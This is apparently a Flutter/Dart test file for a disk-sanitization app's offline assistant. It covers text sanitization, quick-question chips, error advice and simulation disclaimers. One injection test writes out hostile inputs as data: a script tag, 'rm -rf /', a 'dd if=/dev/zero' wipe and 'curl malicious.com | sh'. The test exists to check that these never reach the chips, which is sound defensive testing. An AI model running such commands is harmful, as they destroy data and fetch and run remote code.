import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:provider/provider.dart';
import 'package:zero_trace/features/ai_assistant/presentation/ai_assistant_screen.dart';
import 'package:zero_trace/models/assistant_context.dart';
import 'package:zero_trace/models/device_profile.dart';
import 'package:zero_trace/models/sanitization_error_code.dart';
import 'package:zero_trace/models/sanitization_job.dart';
import 'package:zero_trace/models/sanitization_support_level.dart';
import 'package:zero_trace/models/untrusted_text.dart';
import 'package:zero_trace/services/ai_service.dart';
import 'package:zero_trace/services/assistant_context_builder.dart';
import 'package:zero_trace/services/sanitization_controller.dart';

void main() {
  group('UntrustedText Sanitization (Amendment 5)', () {
    test('strips control characters and collapses whitespace', () {
      const untrusted = UntrustedText('Drive\x00\x07Name\x1B   with \r\n multiple   spaces');
      expect(untrusted.sanitized, 'Drive Name with multiple spaces');
      expect(untrusted.rawValue, 'Drive\x00\x07Name\x1B   with \r\n multiple   spaces');
    });

    test('enforces 120-character maximum length cap', () {
      final longString = 'A' * 200;
      final untrusted = UntrustedText(longString);
      expect(untrusted.sanitized.length, 120);
      expect(untrusted.sanitized, 'A' * 120);
    });

    test('handles empty or blank string gracefully', () {
      const empty = UntrustedText('');
      expect(empty.sanitized, '');
      expect(empty.toString(), '');
    });
  });

  group('AssistantContext Model Constraints & Platform (Amendments 4, 5, 8)', () {
    test('contains no physical serial, path, or WWN fields', () {
      const context = AssistantContext(
        deviceName: UntrustedText('Kingston DataTraveler'),
        driveType: DriveType.usb,
        mediaType: MediaType.usbFlash,
        busType: 'USB',
        sizeBytes: 32000000000,
        formattedSize: '32 GB',
        supportLevel: SanitizationSupportLevel.clearOnly,
        isFlash: true,
        isRemovable: true,
      );

      // Verify accessible coarse facts
      expect(context.deviceNameText, 'Kingston DataTraveler');
      expect(context.driveType, DriveType.usb);
      expect(context.isFlash, true);
      expect(context.platform, 'unknown'); // Default is unknown (Amendment 4)
      expect(context.targetSummary, 'Kingston DataTraveler');
    });

    test('platform defaults to unknown with platform-neutral wording', () {
      const defaultContext = AssistantContext();
      expect(defaultContext.platform, 'unknown');

      final neutralExplain = SanitizationErrorCode.permissionDenied.explain(platform: defaultContext.platform);
      expect(neutralExplain.nextStep, contains('Approve the administrator elevation prompt'));
      expect(neutralExplain.nextStep.toLowerCase().contains('polkit'), false);
      expect(neutralExplain.nextStep.toLowerCase().contains('uac'), false);
    });

    test('platform supports Windows, Android, and Linux strings', () {
      const winContext = AssistantContext(platform: 'Windows');
      const androidContext = AssistantContext(platform: 'Android');
      const linContext = AssistantContext(platform: 'Linux');

      final winExplain = SanitizationErrorCode.permissionDenied.explain(platform: winContext.platform);
      expect(winExplain.nextStep, contains('User Account Control (UAC)'));

      final androidExplain = SanitizationErrorCode.permissionDenied.explain(platform: androidContext.platform);
      expect(androidExplain.nextStep, contains('USB permission required. Allow USB access when Android asks.'));

      final linExplain = SanitizationErrorCode.permissionDenied.explain(platform: linContext.platform);
      expect(linExplain.nextStep, contains('Polkit'));
    });

    test('targetSummary reflects disconnected state', () {
      const context = AssistantContext(
        deviceName: UntrustedText('SanDisk Ultra'),
        isDisconnected: true,
      );
      expect(context.targetSummary, 'SanDisk Ultra (disconnected)');
    });

    test('targetSummary reflects empty state', () {
      const context = AssistantContext();
      expect(context.targetSummary, 'None (general knowledge)');
    });
  });

  group('AssistantContext Quick Questions (Amendment 6)', () {
    test('caps quick questions at 6 maximum', () {
      const context = AssistantContext(
        deviceName: UntrustedText('Flash Drive'),
        isFlash: true,
        isSecurityFrozen: true,
        hasHpaDco: true,
        hasCertificate: true,
        verificationPassed: false,
        lastErrorCode: SanitizationErrorCode.timeout,
      );

      final questions = context.quickQuestions;
      expect(questions.length, lessThanOrEqualTo(6));
    });

    test('prioritizes errors and failures first', () {
      const context = AssistantContext(
        deviceName: UntrustedText('Samsung 980'),
        isFlash: true,
        verificationPassed: false,
        lastErrorCode: SanitizationErrorCode.verificationFailed,
      );

      final questions = context.quickQuestions;
      expect(questions.first, 'Why did verification fail?');
      expect(questions[1], contains('Explain this error: verificationFailed'));
    });

    test('shows HPA/DCO question ONLY when device has HpaDco', () {
      const withoutHpa = AssistantContext(
        deviceName: UntrustedText('Drive A'),
        hasHpaDco: false,
      );
      expect(withoutHpa.quickQuestions.contains('What are HPA/DCO hidden sectors?'), false);

      const withHpa = AssistantContext(
        deviceName: UntrustedText('Drive B'),
        hasHpaDco: true,
      );
      expect(withHpa.quickQuestions.contains('What are HPA/DCO hidden sectors?'), true);
    });

    test('shows security frozen question ONLY when device is security frozen', () {
      const notFrozen = AssistantContext(
        deviceName: UntrustedText('Drive A'),
        isSecurityFrozen: false,
      );
      expect(notFrozen.quickQuestions.contains('What does security frozen mean?'), false);

      const frozen = AssistantContext(
        deviceName: UntrustedText('Drive B'),
        isSecurityFrozen: true,
      );
      expect(frozen.quickQuestions.contains('What does security frozen mean?'), true);
    });

    test('shows certificate questions only when certificate exists', () {
      const noCert = AssistantContext();
      expect(noCert.quickQuestions.contains('Explain this certificate'), false);

      const withCert = AssistantContext(hasCertificate: true);
      expect(withCert.quickQuestions.contains('Explain this certificate'), true);
      expect(withCert.quickQuestions.contains('What does the cryptographic signature prove?'), true);
    });

    test('fallback detection works: unknown query produces isFallback == true', () {
      final aiService = AiService();
      final unknownResponse = aiService.processQuery('xyzzy totally unmapped query string 12345');
      expect(
        unknownResponse.isFallback,
        true,
        reason: 'Unknown queries must be flagged with isFallback = true.',
      );
      expect(unknownResponse.answer, contains('I can help with questions about storage sanitization methods'));
    });

    test('every generated quick question returns its exact expected handlerId (isFallback == false)', () {
      final aiService = AiService();

      final expectedHandlers = <String, String>{
        'Why did verification fail?': 'verification_failure',
        'What should I do after this error?': 'error_explanation',
        'Why did the sanitization fail?': 'error_explanation',
        'Explain this certificate': 'certificate_explanation',
        'What does the cryptographic signature prove?': 'signature_explanation',
        'What does security frozen mean?': 'security_frozen',
        'What are HPA/DCO hidden sectors?': 'hpa_dco',
        'Why is overwrite not recommended for SSDs?': 'ssd_overwrite',
        'What is the Flash Translation Layer?': 'pales_research',
        'How does overwrite work for HDDs?': 'hdd_overwrite',
        'What sanitization method is recommended?': 'recommend_method',
        'Why is this device high risk?': 'risk_explanation',
        'Explain CLEAR vs PURGE': 'clear_vs_purge',
        'Explain NIST SP 800-88 categories': 'nist_standards',
        'What does cryptographic erase mean?': 'crypto_erase',
        'What is physical destruction?': 'physical_destruction',
        'What is PALES research?': 'pales_research',
      };

      // Test across multiple state permutations
      final testContexts = [
        const AssistantContext(), // Generic
        const AssistantContext(hasCertificate: true),
        const AssistantContext(deviceName: UntrustedText('USB'), isFlash: true),
        const AssistantContext(deviceName: UntrustedText('HDD'), isRotational: true),
        const AssistantContext(deviceName: UntrustedText('SSD'), hasHpaDco: true, isSecurityFrozen: true),
        const AssistantContext(verificationPassed: false, lastErrorCode: SanitizationErrorCode.timeout),
        const AssistantContext(jobStatus: JobStatus.failed, lastErrorCode: SanitizationErrorCode.deviceNotFound),
      ];

      final allQuestions = <String>{};
      for (final ctx in testContexts) {
        allQuestions.addAll(ctx.quickQuestions);
      }

      for (final question in allQuestions) {
        final response = aiService.processQuery(question);
        expect(
          response.isFallback,
          false,
          reason: 'Generated question "$question" returned fallback response instead of a specialized handler.',
        );
        expect(response.answer.isNotEmpty, true);

        final expectedHandler = question.startsWith('Explain this error:')
            ? 'error_explanation'
            : expectedHandlers[question];

        expect(
          response.handlerId,
          expectedHandler,
          reason: 'Question "$question" must route to exact handler "$expectedHandler", got "${response.handlerId}"',
        );
      }
    });

    test('quick-question chips are built only from typed enums/codes, never from raw untrusted strings', () {
      const hostileContext = AssistantContext(
        deviceName: UntrustedText('<script>alert("pwned")</script> rm -rf / ; sudo dd if=/dev/zero'),
        lastErrorMessage: UntrustedText('CRITICAL: rm -rf / ; curl malicious.com | sh'),
        certificateId: UntrustedText('CERT-PAYLOAD-DROPPER-007'),
        lastErrorCode: SanitizationErrorCode.permissionDenied,
      );

      final chips = hostileContext.quickQuestions;
      for (final chip in chips) {
        expect(chip.contains('<script>'), false);
        expect(chip.contains('rm -rf'), false);
        expect(chip.contains('curl'), false);
        expect(chip.contains('malicious.com'), false);
        expect(chip.contains('CERT-PAYLOAD'), false);
        expect(chip.contains('pwned'), false);
      }
      expect(chips.contains('Explain this error: permissionDenied'), true);
    });
  });

  group('Simulation Mode Disclaimers (Amendment 7)', () {
    test('states nothing was actually erased when isSimulated is true', () {
      final aiService = AiService();
      const simContext = AssistantContext(
        deviceName: UntrustedText('Simulated Drive'),
        isSimulated: true,
      );

      final response = aiService.processQuery(
        'What sanitization method is recommended?',
        context: simContext,
      );

      expect(response.isSimulated, true);
      expect(
        response.answer.contains('nothing was actually erased') ||
        response.warnings.any((w) => w.contains('nothing was actually erased')),
        true,
        reason: 'Simulated query response must state nothing was actually erased.',
      );
    });

    test('explainError states simulation mode when isSimulated is true', () {
      final aiService = AiService();
      const simContext = AssistantContext(
        isSimulated: true,
        lastErrorCode: SanitizationErrorCode.timeout,
      );

      final response = aiService.explainError(
        SanitizationErrorCode.timeout,
        context: simContext,
      );

      expect(response.isSimulated, true);
      expect(response.answer.contains('[SIMULATION MODE]'), true);
      expect(response.warnings.any((w) => w.contains('[SIMULATION MODE]')), true);
    });
  });

  group('Typed Error Explanations (Amendments 1 & 2)', () {
    test('PERMISSION_DENIED advice never mentions root/sudo and is platform-aware', () {
      final linExplain = SanitizationErrorCode.permissionDenied.explain(platform: 'Linux');
      expect(linExplain.nextStep.toLowerCase().contains('sudo'), false);
      expect(linExplain.nextStep.toLowerCase().contains('run as root'), false);
      expect(linExplain.nextStep, contains('Polkit'));

      final winExplain = SanitizationErrorCode.permissionDenied.explain(platform: 'Windows');
      expect(winExplain.nextStep, contains('User Account Control (UAC)'));
      expect(winExplain.dataMayRemain, false);
    });

    test('TIMEOUT advice says reconnect and retry, failing if repeated, no speculation', () {
      final timeoutExplain = SanitizationErrorCode.timeout.explain(jobStarted: true);
      expect(timeoutExplain.nextStep, contains('Reconnect the drive and try again'));
      expect(timeoutExplain.nextStep, contains('failing or degraded'));
      expect(timeoutExplain.dataMayRemain, true);
    });

    test('failure explanations state data may remain unless job never started', () {
      // Disconnected mid-job
      final midJob = SanitizationErrorCode.deviceNotFound.explain(jobStarted: true);
      expect(midJob.dataMayRemain, true);

      // Blocked before starting (e.g. root disk protection)
      final blocked = SanitizationErrorCode.bootDiskProtection.explain(jobStarted: false);
      expect(blocked.dataMayRemain, false);
      expect(blocked.toFormattedText(), contains('Existing drive contents remain unchanged'));
    });
  });

  group('HDD Overwrite Assurance (Amendment 9)', () {
    test('HDD answers stay at Clear-level and never claim unrecoverable', () {
      final aiService = AiService();
      const hddContext = AssistantContext(
        deviceName: UntrustedText('Seagate Barracuda'),
        isRotational: true,
      );

      final response = aiService.processQuery(
        'How does overwrite work for HDDs?',
        context: hddContext,
      );

      expect(response.answer.toLowerCase().contains('unrecoverable'), false);
      expect(response.answer, contains('Clear Level'));
      expect(response.answer, contains('NIST SP 800-88 Rev. 2'));
    });
  });

  group('AssistantContextBuilder & Assistant Decoupling (Amendments 3 & 4)', () {
    late SanitizationController controller;

    const testDevice1 = DeviceProfile(
      id: '/dev/sdb',
      name: 'USB Pen Drive',
      serialNumber: 'USB1234',
      mediaType: MediaType.usbFlash,
      busType: 'USB',
      capacityBytes: 16000000000,
      isRemovable: true,
    );

    const testDevice2 = DeviceProfile(
      id: '/dev/sdc',
      name: 'External SSD',
      serialNumber: 'SSD5678',
      mediaType: MediaType.sataSsd,
      busType: 'USB',
      capacityBytes: 500000000000,
      isRemovable: true,
    );

    setUp(() {
      controller = SanitizationController(deferInitialDiscovery: true);
      controller.setMockDevices([testDevice1, testDevice2]);
      controller.selectDevice(testDevice1);
    });

    tearDown(() {
      controller.dispose();
    });

    test('AssistantContextBuilder creates snapshot without mutating controller', () {
      final initialSelected = controller.selectedDevice;
      final snapshot = AssistantContextBuilder.fromController(controller);

      expect(snapshot.deviceNameText, 'USB Pen Drive');
      expect(snapshot.isFlash, true);
      expect(snapshot.isDisconnected, false);
      expect(controller.selectedDevice, equals(initialSelected));
    });

    test('AssistantContextBuilder detects disconnected device', () {
      // Disconnect testDevice1 by removing from devices list
      controller.setMockDevices([testDevice2]);

      final snapshot = AssistantContextBuilder.fromController(
        controller,
        overrideDevice: testDevice1,
      );

      expect(snapshot.isDisconnected, true);
      expect(snapshot.targetSummary, contains('disconnected'));
    });

    testWidgets('Changing assistant context chip NEVER alters controller.selectedDevice', (tester) async {
      await tester.pumpWidget(
        MaterialApp(
          home: ChangeNotifierProvider<SanitizationController>.value(
            value: controller,
            child: const AiAssistantScreen(),
          ),
        ),
      );
      await tester.pumpAndSettle();

      // Initially controller has testDevice1
      expect(controller.selectedDevice?.name, 'USB Pen Drive');

      // Tap context chip in header
      final chipFinder = find.byKey(const Key('assistant_context_chip'));
      expect(chipFinder, findsOneWidget);
      await tester.tap(chipFinder);
      await tester.pumpAndSettle();

      // Bottom sheet should display "External SSD" and "Clear Context"
      final ssdOption = find.text('External SSD');
      expect(ssdOption, findsOneWidget);

      // Select External SSD for the assistant
      await tester.tap(ssdOption);
      await tester.pumpAndSettle();

      // Controller selectedDevice MUST REMAIN testDevice1 (USB Pen Drive)!
      expect(
        controller.selectedDevice?.name,
        'USB Pen Drive',
        reason: 'Assistant context selection must NEVER mutate controller.selectedDevice!',
      );

      // Verify chip in assistant now shows External SSD
      expect(find.text('External SSD'), findsOneWidget);

      // Now tap again and Clear Context
      await tester.tap(chipFinder);
      await tester.pumpAndSettle();

      final clearButton = find.text('Clear Context');
      expect(clearButton, findsOneWidget);
      await tester.tap(clearButton);
      await tester.pumpAndSettle();

      // Controller selectedDevice is STILL testDevice1!
      expect(
        controller.selectedDevice?.name,
        'USB Pen Drive',
        reason: 'Clearing assistant context must NEVER alter controller.selectedDevice!',
      );

      // Chip now displays "No device selected"
      expect(find.text('No device selected'), findsOneWidget);
    });
  });

  group('Architectural Import Isolation (Item 7)', () {
    test('ai_service.dart and assistant_context.dart import no controller, execution, or process code', () {
      final forbiddenImports = [
        'sanitization_controller.dart',
        'real_sanitization_service.dart',
        'certificate_service.dart',
        'orphaned_process_checker.dart',
        'device_simulator.dart',
        'execute.rs',
      ];

      final filesToCheck = [
        File('lib/models/assistant_context.dart'),
        File('lib/services/ai_service.dart'),
        File('lib/models/untrusted_text.dart'),
        File('lib/models/sanitization_error_code.dart'),
      ];

      for (final file in filesToCheck) {
        expect(file.existsSync(), true, reason: 'File ${file.path} must exist');
        final content = file.readAsStringSync();
        final lines = content.split('\n');

        for (final line in lines) {
          final trimmed = line.trim();
          if (trimmed.startsWith('import ') || trimmed.startsWith('export ')) {
            for (final forbidden in forbiddenImports) {
              expect(
                trimmed.contains(forbidden),
                false,
                reason: 'Architecture violation: ${file.path} imports $forbidden in line: "$trimmed"',
              );
            }
            // Also ensure no dart:io Process imports
            expect(
              trimmed.contains('dart:io') && trimmed.contains('Process'),
              false,
              reason: 'Architecture violation: ${file.path} imports Process from dart:io',
            );
          }
        }
      }
    });
  });

  group('MediaTechnology Tri-State (Cleanup Item 1)', () {
    test('USB HDD: positive RPM classifies as rotational', () {
      const usbHdd = DeviceProfile(
        id: 'usb_hdd',
        name: 'WD Elements 2TB',
        serialNumber: 'WDC-USB-9988',
        mediaType: MediaType.hdd,
        busType: 'USB',
        capacityBytes: 2000000000000,
        rotationalRpm: 5400,
        isRemovable: true,
      );

      expect(usbHdd.mediaTechnology, MediaTechnology.rotational);
      expect(usbHdd.isRotational, true);
      expect(usbHdd.isFlashMedia, false);
    });

    test('USB Flash: classifies as flash', () {
      const usbFlash = DeviceProfile(
        id: 'usb_flash',
        name: 'SanDisk Ultra',
        serialNumber: 'SD-USB-1234',
        mediaType: MediaType.usbFlash,
        busType: 'USB',
        capacityBytes: 32000000000,
        rotationalRpm: 0,
        isRemovable: true,
      );

      expect(usbFlash.mediaTechnology, MediaTechnology.flash);
      expect(usbFlash.isFlashMedia, true);
      expect(usbFlash.isRotational, false);
    });

    test('Unknown-media USB bridge: classifies as unknown', () {
      const usbBridge = DeviceProfile(
        id: 'usb_bridge',
        name: 'JMicron Generic Enclosure',
        serialNumber: 'JM-001122',
        mediaType: MediaType.unknown,
        busType: 'USB',
        capacityBytes: 500000000000,
        rotationalRpm: null,
        isRemovable: true,
      );

      expect(usbBridge.mediaTechnology, MediaTechnology.unknown);
      expect(usbBridge.isFlashMedia, false);
      expect(usbBridge.isRotational, false);
    });

    test('Conflicting signals: NVMe with positive RPM classifies as unknown', () {
      const conflictingNvme = DeviceProfile(
        id: 'nvme_conflicting',
        name: 'Odd NVMe Reporting 7200 RPM',
        serialNumber: 'NVME-ANOMALY',
        mediaType: MediaType.nvmeSsd,
        busType: 'PCIe NVMe',
        capacityBytes: 1000000000000,
        rotationalRpm: 7200,
        isRemovable: false,
      );

      expect(conflictingNvme.mediaTechnology, MediaTechnology.unknown);
      expect(conflictingNvme.isFlashMedia, false);
      expect(conflictingNvme.isRotational, false);
    });

    test('SATA HDD with no RPM reported is classified as rotational', () {
      const sataHdd = DeviceProfile(
        id: 'sata_hdd',
        name: 'Seagate Barracuda',
        serialNumber: 'ST-1000-DM',
        mediaType: MediaType.hdd,
        busType: 'SATA',
        capacityBytes: 1000000000000,
        rotationalRpm: null,
        isRemovable: false,
      );

      expect(sataHdd.mediaTechnology, MediaTechnology.rotational);
      expect(sataHdd.isRotational, true);
      expect(sataHdd.isFlashMedia, false);
    });
  });
}
